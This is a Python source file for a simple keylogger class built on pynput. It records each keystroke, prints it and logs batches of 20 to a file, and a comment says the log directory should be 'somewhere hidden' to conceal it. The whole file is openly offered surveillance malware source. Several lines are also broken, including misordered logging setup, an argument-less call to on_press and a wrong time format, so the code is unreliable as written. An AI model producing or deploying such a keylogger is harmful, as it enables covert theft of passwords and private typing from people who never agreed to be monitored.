from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

class MyKeyLogger:
    _timeout = 10
    _events = []
    _log_dir = "" # Should make somewhere hidden
    _log_filename = datetime.strftime(datetime.now(),"%Y%m%d_%H:%m.log")
    _log_file_fullpath = ""
    
    def __init__(self):
        self._log_file_fullpath = self._log_dir + self._log_filename
            
    def reset_timeout(self):
        self._timeout = 10
    
    def on_press(self, key):
        try:
            self._events.append(str(key.char))
            print(self._events)
        except AttributeError:
            print('{0}'.format(key))
        if len(self._events) == 20:
            for i in self._events:
                logging.info(i)
        logging.basicConfig(filename=self._log_file_fullpath, level=logging.DEBUG, format='%(message)s')
    
    def do_listening(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
        self.on_press()

def __main__():
    my_key_logger = MyKeyLogger()
    my_key_logger.do_listening()

if __name__ == "__main__":
    __main__()
